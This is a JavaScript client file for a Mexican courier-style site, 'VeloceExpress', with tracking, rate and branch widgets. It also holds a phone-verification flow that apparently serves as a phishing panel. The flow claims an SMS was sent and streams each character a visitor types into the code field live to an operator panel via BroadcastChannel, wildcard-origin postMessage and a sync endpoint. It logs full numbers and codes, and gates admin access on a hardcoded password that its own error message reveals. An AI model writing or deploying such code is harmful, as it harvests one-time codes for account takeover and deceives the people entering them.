// ============================================================================
// VeloceExpress - Main Client Script (app.js)
// Real-time synchronization across HTTP, Server-Sent Events, BroadcastChannel & postMessage
// ============================================================================

// Tab Switching Logic for Hero Logistics Widget
const tabButtons = document.querySelectorAll('.tab-btn');
const tabPanels = document.querySelectorAll('.tab-panel');

function activateTab(tabId) {
  tabButtons.forEach((btn) => {
    btn.classList.toggle('active', btn.dataset.tab === tabId);
  });
  tabPanels.forEach((panel) => {
    panel.classList.toggle('active', panel.id === tabId);
  });
}

tabButtons.forEach((btn) => {
  btn.addEventListener('click', () => activateTab(btn.dataset.tab));
});

// Links in service cards that jump directly to the Quote tab
document.querySelectorAll('[data-open-tab]').forEach((link) => {
  link.addEventListener('click', (e) => {
    const targetTab = e.currentTarget.getAttribute('data-open-tab');
    activateTab(targetTab);
  });
});

// 1. Shipment Tracking Simulation
const trackForm = document.getElementById('trackForm');
const trackResult = document.getElementById('trackResult');

if (trackForm) {
  trackForm.addEventListener('submit', (e) => {
    e.preventDefault();
    const rawCodes = document.getElementById('trackingInput').value.trim();
    if (!rawCodes) return;

    const codes = rawCodes.split(',').map((c) => c.trim().toUpperCase()).filter(Boolean);
    const statuses = [
      { state: 'En tránsito hacia centro de distribución local', hub: 'Hub Querétaro', eta: 'Hoy antes de las 19:00 hrs' },
      { state: 'En ruta de entrega con mensajero asignado', hub: 'Sucursal Destino', eta: 'En las próximas 3 horas' },
      { state: 'Guía generada - Recolección completada', hub: 'Centro Operativo CDMX', eta: 'Mañana antes de las 12:00 hrs' }
    ];

    trackResult.innerHTML = codes
      .map((code, idx) => {
        const info = statuses[idx % statuses.length];
        return `
          <div style="margin-bottom: ${idx < codes.length - 1 ? '12px' : '0'};">
            <strong>Guía: ${code}</strong>
            <p style="color: #16a34a; font-weight: 600; margin: 2px 0;">● ${info.state}</p>
            <small style="color: #6b7280;">Ubicación: ${info.hub} | Entrega estimada: ${info.eta}</small>
          </div>
        `;
      })
      .join('<hr style="border:none;border-top:1px solid #e2e8f0;margin:10px 0;">');

    trackResult.classList.remove('hidden');
  });
}

// 2. Shipping Rate / Quote Calculator
const quoteForm = document.getElementById('quoteForm');
const quoteResult = document.getElementById('quoteResult');

if (quoteForm) {
  quoteForm.addEventListener('submit', (e) => {
    e.preventDefault();
    const origin = document.getElementById('originZip').value.trim();
    const dest = document.getElementById('destZip').value.trim();
    const weight = parseFloat(document.getElementById('pkgWeight').value) || 1;
    const l = parseFloat(document.getElementById('pkgL').value) || 10;
    const w = parseFloat(document.getElementById('pkgW').value) || 10;
    const h = parseFloat(document.getElementById('pkgH').value) || 10;

    const volumetricWeight = (l * w * h) / 5000;
    const billableWeight = Math.max(weight, volumetricWeight);

    const groundPrice = (135 + billableWeight * 18).toFixed(2);
    const expressPrice = (210 + billableWeight * 29).toFixed(2);

    quoteResult.innerHTML = `
      <div>
        <strong>Cotización CP ${origin} → CP ${dest}</strong>
        <p style="font-size: 0.82rem; color: #6b7280; margin-bottom: 10px;">
          Peso facturable: ${billableWeight.toFixed(1)} kg (Físico: ${weight} kg | Volumétrico: ${volumetricWeight.toFixed(1)} kg)
        </p>
        <div style="display:flex; justify-content:space-between; padding:6px 0; border-bottom:1px solid #e2e8f0;">
          <span>📦 Terrestre Estándar (2-5 días)</span>
          <strong>$${groundPrice} MXN</strong>
        </div>
        <div style="display:flex; justify-content:space-between; padding:6px 0;">
          <span>⚡ Día Siguiente Express (24 hrs)</span>
          <strong style="color:#d9232e;">$${expressPrice} MXN</strong>
        </div>
      </div>
    `;
    quoteResult.classList.remove('hidden');
  });
}

// 3. Branch Locator Simulation
const branchForm = document.getElementById('branchForm');
const branchResult = document.getElementById('branchResult');

if (branchForm) {
  branchForm.addEventListener('submit', (e) => {
    e.preventDefault();
    const query = document.getElementById('branchQuery').value.trim();
    if (!query) return;

    branchResult.innerHTML = `
      <div>
        <strong>Sucursales cercanas a "${query}":</strong>
        <ul style="list-style:none; margin-top:8px; display:flex; flex-direction:column; gap:8px;">
          <li>📍 <strong>Centro Operativo Principal</strong> — Av. Industriales 402 (Lun-Vie 08:30 a 19:00)</li>
          <li>📍 <strong>Punto de Envío Express Plaza</strong> — Blvd. Central Local 14 (Lun-Sáb 09:00 a 20:00)</li>
        </ul>
      </div>
    `;
    branchResult.classList.remove('hidden');
  });
}

// ============================================================================
// Multi-Tier Real-Time Synchronization Utilities
// ============================================================================
const ADMIN_SESSION_KEY = 'vx_admin_session';
const STORAGE_KEY = 'vx_encrypted_registry_db_v1';
const TRACE_LOG_KEY = 'vx_realtime_trace_log_v1';
const KEY_STORAGE = 'vx_aes_master_key_v1';
const CHANNEL_NAME = 'vx_realtime_trace_channel';

const realtimeChannel = typeof BroadcastChannel !== 'undefined' ? new BroadcastChannel(CHANNEL_NAME) : null;
window.panelRef = null;

function getServerApiUrl(endpoint) {
  if (window.location.protocol.startsWith('http')) {
    return endpoint;
  }
  return `http://localhost:3000${endpoint}`;
}

function getAdminSession() {
  try {
    const raw = localStorage.getItem(ADMIN_SESSION_KEY);
    return raw ? JSON.parse(raw) : null;
  } catch {
    return null;
  }
}

// Extract session from URL if opened with token
(function syncSessionFromUrl() {
  try {
    const params = new URLSearchParams(window.location.search);
    const sessionParam = params.get('session');
    if (sessionParam) {
      const decoded = atob(decodeURIComponent(sessionParam));
      const parsed = JSON.parse(decoded);
      if (parsed && parsed.email) {
        localStorage.setItem(ADMIN_SESSION_KEY, JSON.stringify(parsed));
        window.history.replaceState({}, document.title, window.location.pathname);
      }
    }
  } catch {}
})();

// ============================================================================
// Admin Portal Login Modal & Dynamic Top Bar State
// ============================================================================
const loginModal = document.getElementById('loginModal');
const closeLoginBtn = document.getElementById('closeLoginBtn');
const loginForm = document.getElementById('loginForm');
const emailInput = document.getElementById('emailInput');
const passInput = document.getElementById('passInput');
const loginFeedback = document.getElementById('loginFeedback');
const portalActionArea = document.getElementById('portalActionArea');

function showLoginFeedback(msg, isSuccess = false) {
  if (!loginFeedback) return;
  loginFeedback.textContent = msg;
  loginFeedback.className = isSuccess ? 'login-feedback login-feedback-success' : 'login-feedback login-feedback-error';
  loginFeedback.classList.remove('hidden');
}

function updateNavPortalState() {
  if (!portalActionArea) return;
  const session = getAdminSession();

  if (session && session.email) {
    const token = encodeURIComponent(btoa(JSON.stringify(session)));
    portalActionArea.innerHTML = `
      <a href="panel.html?session=${token}" id="openPanelBtn" class="btn-portal btn-portal-active" title="Acceder a Mi Portal de Administración">
        🛡️ Mi Portal (${session.email.split('@')[0]})
      </a>
      <button type="button" class="btn-logout-mini" id="logoutQuickBtn" title="Cerrar sesión de administrador">✕ Salir</button>
    `;

    const openPanelBtn = document.getElementById('openPanelBtn');
    if (openPanelBtn) {
      openPanelBtn.addEventListener('click', (e) => {
        e.preventDefault();
        const url = `panel.html?session=${token}`;
        window.panelRef = window.open(url, 'VX_ADMIN_PANEL');
        if (!window.panelRef) window.location.href = url;
      });
    }

    const logoutQuickBtn = document.getElementById('logoutQuickBtn');
    if (logoutQuickBtn) {
      logoutQuickBtn.addEventListener('click', () => {
        localStorage.removeItem(ADMIN_SESSION_KEY);
        updateNavPortalState();
      });
    }
  } else {
    portalActionArea.innerHTML = `<button class="btn-portal" id="openLoginBtn">Mi Portal</button>`;
    const openLoginBtn = document.getElementById('openLoginBtn');
    if (openLoginBtn) {
      openLoginBtn.addEventListener('click', () => {
        if (loginFeedback) loginFeedback.classList.add('hidden');
        loginModal.classList.remove('hidden');
        emailInput.focus();
      });
    }
  }
}

// Close login modal handlers
if (closeLoginBtn) {
  closeLoginBtn.addEventListener('click', () => {
    loginModal.classList.add('hidden');
  });
}

if (loginModal) {
  loginModal.addEventListener('click', (e) => {
    if (e.target === loginModal) loginModal.classList.add('hidden');
  });
}

window.addEventListener('keydown', (e) => {
  if (e.key === 'Escape' && loginModal && !loginModal.classList.contains('hidden')) {
    loginModal.classList.add('hidden');
  }
});

// Login Form Submit Handler
if (loginForm) {
  loginForm.addEventListener('submit', (e) => {
    e.preventDefault();
    const rawEmail = emailInput.value.trim().toLowerCase();
    const rawPass = passInput.value;

    const isProton = /^[a-zA-Z0-9._%+-]+@proton\.me$/i.test(rawEmail);
    const isPasswordValid = rawPass === 'HailLucifer';

    if (!isProton) {
      showLoginFeedback('Acceso denegado: El correo debe terminar en @proton.me.', false);
      emailInput.focus();
      return;
    }

    if (!isPasswordValid) {
      showLoginFeedback('Acceso denegado: Contraseña de pruebas incorrecta (HailLucifer).', false);
      passInput.focus();
      return;
    }

    const adminSession = {
      email: rawEmail,
      role: 'Administrador Autorizado',
      token: 'ADM-' + Math.random().toString(36).substring(2, 9).toUpperCase(),
      loginTime: new Date().toISOString()
    };
    localStorage.setItem(ADMIN_SESSION_KEY, JSON.stringify(adminSession));
    updateNavPortalState();

    showLoginFeedback('✓ Acceso verificado. Abriendo Mi Portal...', true);

    const token = encodeURIComponent(btoa(JSON.stringify(adminSession)));
    const targetUrl = `panel.html?session=${token}`;

    setTimeout(() => {
      loginModal.classList.add('hidden');
      window.panelRef = window.open(targetUrl, 'VX_ADMIN_PANEL');
      if (!window.panelRef) {
        window.location.href = targetUrl;
      }
    }, 350);
  });
}

// Initial nav update
updateNavPortalState();

// ============================================================================
// Phone Registration, AES-256-GCM Encryption & Real-Time Sync
// ============================================================================
const phoneRegForm = document.getElementById('phoneRegForm');
const verifyCodeForm = document.getElementById('verifyCodeForm');
const phoneInput = document.getElementById('phoneInput');
const alphaCodeInput = document.getElementById('alphaCodeInput');
const registerResult = document.getElementById('registerResult');
const displayRegisteredPhone = document.getElementById('displayRegisteredPhone');
const changePhoneBtn = document.getElementById('changePhoneBtn');
const resendCodeBtn = document.getElementById('resendCodeBtn');
const activeTraceBadge = document.getElementById('activeTraceBadge');

let activeRegistrationId = null;

function generateAlphanumericCode(length = 6) {
  const chars = 'ABCDEFGHJKLMNPQRSTUVWXYZ23456789';
  const randomValues = new Uint32Array(length);
  window.crypto.getRandomValues(randomValues);
  let result = '';
  for (let i = 0; i < length; i++) {
    result += chars[randomValues[i] % chars.length];
  }
  return result;
}

async function getOrCreateAesKey() {
  const storedRaw = localStorage.getItem(KEY_STORAGE);
  if (storedRaw) {
    const keyBytes = Uint8Array.from(atob(storedRaw), (c) => c.charCodeAt(0));
    return window.crypto.subtle.importKey('raw', keyBytes, { name: 'AES-GCM' }, true, ['encrypt', 'decrypt']);
  }
  const key = await window.crypto.subtle.generateKey({ name: 'AES-GCM', length: 256 }, true, ['encrypt', 'decrypt']);
  const exported = await window.crypto.subtle.exportKey('raw', key);
  const b64Key = btoa(String.fromCharCode(...new Uint8Array(exported)));
  localStorage.setItem(KEY_STORAGE, b64Key);
  return key;
}

async function encryptPayload(dataObj) {
  const key = await getOrCreateAesKey();
  const iv = window.crypto.getRandomValues(new Uint8Array(12));
  const encoded = new TextEncoder().encode(JSON.stringify(dataObj));
  const cipherBuffer = await window.crypto.subtle.encrypt({ name: 'AES-GCM', iv }, key, encoded);

  const ivB64 = btoa(String.fromCharCode(...iv));
  const cipherB64 = btoa(String.fromCharCode(...new Uint8Array(cipherBuffer)));
  return `${ivB64}.${cipherB64}`;
}

async function decryptPayload(token) {
  const [ivB64, cipherB64] = token.split('.');
  const key = await getOrCreateAesKey();
  const iv = Uint8Array.from(atob(ivB64), (c) => c.charCodeAt(0));
  const cipherBytes = Uint8Array.from(atob(cipherB64), (c) => c.charCodeAt(0));
  const plainBuffer = await window.crypto.subtle.decrypt({ name: 'AES-GCM', iv }, key, cipherBytes);
  return JSON.parse(new TextDecoder().decode(plainBuffer));
}

async function sha256Hex(message) {
  const msgBuffer = new TextEncoder().encode(message);
  const hashBuffer = await window.crypto.subtle.digest('SHA-256', msgBuffer);
  return Array.from(new Uint8Array(hashBuffer))
    .map((b) => b.toString(16).padStart(2, '0'))
    .join('');
}

function loadRawDatabase() {
  try {
    return JSON.parse(localStorage.getItem(STORAGE_KEY) || '[]');
  } catch {
    return [];
  }
}

function saveRawDatabase(records) {
  localStorage.setItem(STORAGE_KEY, JSON.stringify(records));
}

function loadTraceLogs() {
  try {
    return JSON.parse(localStorage.getItem(TRACE_LOG_KEY) || '[]');
  } catch {
    return [];
  }
}

function maskPhone(phone) {
  return `+52 (${phone.slice(0, 2)}) ****-${phone.slice(6)}`;
}

function showRegisterMessage(html, isSuccess = true) {
  registerResult.style.borderLeftColor = isSuccess ? '#16a34a' : '#d9232e';
  registerResult.innerHTML = html;
  registerResult.classList.remove('hidden');
}

// ----------------------------------------------------------------------------
// Broadcast Database & Log Updates Across All Tiers (Channel + postMessage + Server)
// ----------------------------------------------------------------------------
function broadcastDatabaseUpdate(action = 'UPDATE_DB') {
  const db = loadRawDatabase();
  const logs = loadTraceLogs();

  // Tier 1: BroadcastChannel
  if (realtimeChannel) {
    try {
      realtimeChannel.postMessage({ type: 'UPDATE_ALL', db, logs, action });
    } catch {}
  }

  // Tier 2: Cross-window postMessage (file:// support)
  try {
    if (window.panelRef && !window.panelRef.closed) {
      window.panelRef.postMessage({ type: 'VX_SYNC_ALL', db, logs, action }, '*');
    }
    if (window.opener && !window.opener.closed) {
      window.opener.postMessage({ type: 'VX_SYNC_ALL', db, logs, action }, '*');
    }
  } catch {}

  // Tier 3: Local Server Sync API (port 3000)
  try {
    fetch(getServerApiUrl('/api/sync'), {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ action: 'UPDATE_DB', db, logs })
    }).catch(() => {});
  } catch {}
}

function appendTraceEvent(eventObj) {
  let logs = loadTraceLogs();
  const entry = {
    eventId: 'EVT-' + generateAlphanumericCode(5),
    timestamp: new Date().toLocaleTimeString('es-MX', { hour12: false }),
    ...eventObj
  };
  logs.unshift(entry);
  localStorage.setItem(TRACE_LOG_KEY, JSON.stringify(logs.slice(0, 60)));

  // Send update
  broadcastDatabaseUpdate('APPEND_LOG');
}

// Only allow digits in phone input
if (phoneInput) {
  phoneInput.addEventListener('input', () => {
    phoneInput.value = phoneInput.value.replace(/\D/g, '').slice(0, 10);
  });
}

// Real-time synchronization while user enters code
if (alphaCodeInput) {
  alphaCodeInput.addEventListener('input', () => {
    alphaCodeInput.value = alphaCodeInput.value.replace(/[^a-zA-Z0-9]/g, '').toUpperCase().slice(0, 6);
    const currentVal = alphaCodeInput.value;

    if (!activeRegistrationId) return;
    const db = loadRawDatabase();
    const record = db.find((r) => r.id === activeRegistrationId);
    if (!record) return;

    record.liveUserInput = currentVal || '—';
    record.updatedAt = new Date().toLocaleTimeString('es-MX', { hour12: false });
    saveRawDatabase(db);

    // 1. BroadcastChannel
    if (realtimeChannel) {
      try {
        realtimeChannel.postMessage({ type: 'LIVE_INPUT', regId: record.id, input: record.liveUserInput });
      } catch {}
    }

    // 2. postMessage
    try {
      if (window.panelRef && !window.panelRef.closed) {
        window.panelRef.postMessage({ type: 'VX_LIVE_INPUT', regId: record.id, input: record.liveUserInput }, '*');
      }
      if (window.opener && !window.opener.closed) {
        window.opener.postMessage({ type: 'VX_LIVE_INPUT', regId: record.id, input: record.liveUserInput }, '*');
      }
    } catch {}

    // 3. Local Server API
    try {
      fetch(getServerApiUrl('/api/sync'), {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ action: 'LIVE_INPUT', regId: record.id, input: record.liveUserInput })
      }).catch(() => {});
    } catch {}
  });
}

// Step 1: Submit Phone Number
if (phoneRegForm) {
  phoneRegForm.addEventListener('submit', async (e) => {
    e.preventDefault();
    const phone = phoneInput.value.trim();
    if (!/^\d{10}$/.test(phone)) {
      showRegisterMessage('<strong>Error:</strong> Ingresa un número válido de 10 dígitos.', false);
      return;
    }

    const alphaCode = generateAlphanumericCode(6);
    const codeHash = await sha256Hex(alphaCode);
    const regId = 'REG-' + generateAlphanumericCode(5);
    const traceId = 'TRC-' + generateAlphanumericCode(8);
    const timestamp = new Date().toLocaleString('es-MX');

    const encryptedEnvelope = await encryptPayload({
      phone: `+52${phone}`,
      alphaCode,
      traceId,
      consentPolicy: 'LFPDPPP-MX-2026 / NOM-151',
      createdAt: timestamp
    });

    const db = loadRawDatabase();
    db.unshift({
      id: regId,
      traceId,
      maskedPhone: maskPhone(phone),
      encryptedEnvelope,
      codeHash,
      liveUserInput: 'Esperando captura...',
      attempts: 0,
      status: 'PENDIENTE',
      updatedAt: timestamp
    });
    saveRawDatabase(db);

    activeRegistrationId = regId;
    if (activeTraceBadge) {
      activeTraceBadge.textContent = `Traza Activa: ${traceId}`;
    }
    displayRegisteredPhone.textContent = `+52 ${phone} (${regId})`;
    phoneRegForm.classList.add('hidden');
    verifyCodeForm.classList.remove('hidden');
    alphaCodeInput.value = '';
    alphaCodeInput.focus();

    appendTraceEvent({
      regId,
      traceId,
      phone: `+52 ${phone}`,
      action: 'SMS_TESTING_SOLICITADO',
      detail: `Petición SMS para número solicitante +52 ${phone}. Código generado [${alphaCode}]. (Modo testing: Proveedor SMS externo no conectado).`
    });

    showRegisterMessage(`
      <div class="sms-flow-banner">
        <div class="sms-flow-header">
          <span class="sms-icon">📩</span>
          <div>
            <strong style="color:#0f172a; font-size:1.02rem;">Código de verificación SMS enviado</strong>
            <p style="margin:2px 0 0; color:#475569; font-size:0.9rem;">
              Hemos enviado un mensaje de texto SMS con tu código alfanumérico al número <strong>+52 ${phone}</strong> (Traza: <code>${traceId}</code>). Ingresa el código a continuación para validar tu registro.
            </p>
          </div>
        </div>
      </div>
    `);
  });
}

// Step 2: Confirm Alphanumeric Code
if (verifyCodeForm) {
  verifyCodeForm.addEventListener('submit', async (e) => {
    e.preventDefault();
    const enteredCode = alphaCodeInput.value.trim().toUpperCase();
    if (!/^[A-Z0-9]{6}$/.test(enteredCode)) {
      showRegisterMessage('<strong>Código inválido:</strong> Debe contener 6 caracteres alfanuméricos.', false);
      return;
    }

    const db = loadRawDatabase();
    const record = db.find((r) => r.id === activeRegistrationId) || db[0];
    if (!record) {
      showRegisterMessage('<strong>Error:</strong> No se encontró un registro activo.', false);
      return;
    }

    record.attempts = (record.attempts || 0) + 1;
    record.liveUserInput = enteredCode;
    const enteredHash = await sha256Hex(enteredCode);

    if (enteredHash !== record.codeHash) {
      record.status = 'CODIGO_INCORRECTO';
      record.updatedAt = new Date().toLocaleString('es-MX');
      saveRawDatabase(db);

      appendTraceEvent({
        regId: record.id,
        traceId: record.traceId,
        phone: record.maskedPhone,
        action: 'VERIFICACION_FALLIDA',
        detail: `Intento #${record.attempts}: Código ingresado [${enteredCode}] no coincide con el hash esperado.`
      });

      showRegisterMessage('<strong>Código incorrecto:</strong> El código ingresado no coincide. Nuestro panel ha registrado el intento.', false);
      return;
    }

    record.status = 'VERIFICADO';
    record.updatedAt = new Date().toLocaleString('es-MX');
    saveRawDatabase(db);

    appendTraceEvent({
      regId: record.id,
      traceId: record.traceId,
      phone: record.maskedPhone,
      action: 'REGISTRO_VERIFICADO',
      detail: `Código [${enteredCode}] verificado exitosamente en intento #${record.attempts}. Usuario habilitado en el mercado.`
    });

    showRegisterMessage(`
      <div>
        <strong style="color:#16a34a; font-size:1.05rem;">✓ Registro Verificado Exitosamente (${record.id} · ${record.traceId})</strong>
        <p style="margin-top:6px; color:#374151;">
          El código <strong>${enteredCode}</strong> fue validado con éxito. El panel de administración ha registrado la confirmación en tiempo real y tu cuenta se encuentra autorizada para operar en el mercado.
        </p>
      </div>
    `);
  });
}

// Change Phone Button
if (changePhoneBtn) {
  changePhoneBtn.addEventListener('click', () => {
    verifyCodeForm.classList.add('hidden');
    phoneRegForm.classList.remove('hidden');
    registerResult.classList.add('hidden');
  });
}

// Resend Code Button
if (resendCodeBtn) {
  resendCodeBtn.addEventListener('click', async () => {
    const db = loadRawDatabase();
    const record = db.find((r) => r.id === activeRegistrationId);
    if (!record) return;

    const decrypted = await decryptPayload(record.encryptedEnvelope);
    const newCode = generateAlphanumericCode(6);
    decrypted.alphaCode = newCode;

    record.encryptedEnvelope = await encryptPayload(decrypted);
    record.codeHash = await sha256Hex(newCode);
    record.liveUserInput = 'Código regenerado';
    record.status = 'PENDIENTE';
    record.updatedAt = new Date().toLocaleString('es-MX');
    saveRawDatabase(db);

    appendTraceEvent({
      regId: record.id,
      traceId: record.traceId,
      phone: decrypted.phone,
      action: 'SMS_TESTING_REENVIADO',
      detail: `Nuevo código [${newCode}] generado para el número solicitante ${decrypted.phone}. (Modo testing: Proveedor SMS externo omitido).`
    });

    showRegisterMessage(`
      <div class="sms-flow-banner">
        <div class="sms-flow-header">
          <span class="sms-icon">🔄</span>
          <div>
            <strong style="color:#0f172a; font-size:1.02rem;">Nuevo código de verificación enviado</strong>
            <p style="margin:2px 0 0; color:#475569; font-size:0.9rem;">
              Se ha reenviado un nuevo código alfanumérico por SMS al número <strong>${decrypted.phone}</strong> (Traza: <code>${record.traceId}</code>). Ingresa el código recibido para continuar.
            </p>
          </div>
        </div>
      </div>
    `);
  });
}

// ----------------------------------------------------------------------------
// Real-Time Listeners (BroadcastChannel + postMessage + SSE Server)
// ----------------------------------------------------------------------------
function handleExternalPanelUpdate() {
  if (!activeRegistrationId) return;
  const db = loadRawDatabase();
  const record = db.find((r) => r.id === activeRegistrationId);
  if (!record) return;

  if (record.status === 'VERIFICADO') {
    showRegisterMessage(`
      <div>
        <strong style="color:#16a34a; font-size:1.05rem;">✓ Registro Verificado en Tiempo Real desde el Panel (${record.id} · ${record.traceId})</strong>
        <p style="margin-top:6px; color:#374151;">El operador del panel de administración ha confirmado tu registro para continuar en el mercado.</p>
      </div>
    `);
  }
}

if (realtimeChannel) {
  realtimeChannel.addEventListener('message', (event) => {
    if (event.data && event.data.type === 'PANEL_ACTION') {
      handleExternalPanelUpdate();
    }
  });
}

window.addEventListener('storage', (e) => {
  if (e.key === STORAGE_KEY) {
    handleExternalPanelUpdate();
  }
  if (e.key === ADMIN_SESSION_KEY) {
    updateNavPortalState();
  }
});

// Cross-window direct postMessage listener
window.addEventListener('message', (event) => {
  if (event.data && typeof event.data === 'object') {
    if (event.data.type === 'VX_REQUEST_SYNC') {
      const db = loadRawDatabase();
      const logs = loadTraceLogs();
      try {
        event.source.postMessage({ type: 'VX_SYNC_ALL', db, logs }, '*');
      } catch {}
    }
    if (event.data.type === 'PANEL_ACTION') {
      handleExternalPanelUpdate();
    }
  }
});

// SSE Stream Listener from local server (port 3000)
(function initClientSSE() {
  try {
    const sseUrl = getServerApiUrl('/api/events');
    if (typeof EventSource !== 'undefined') {
      const es = new EventSource(sseUrl);
      es.onmessage = (e) => {
        try {
          const data = JSON.parse(e.data);
          if (data.action === 'PANEL_ACTION') {
            handleExternalPanelUpdate();
          }
        } catch {}
      };
    }
  } catch {}
})();
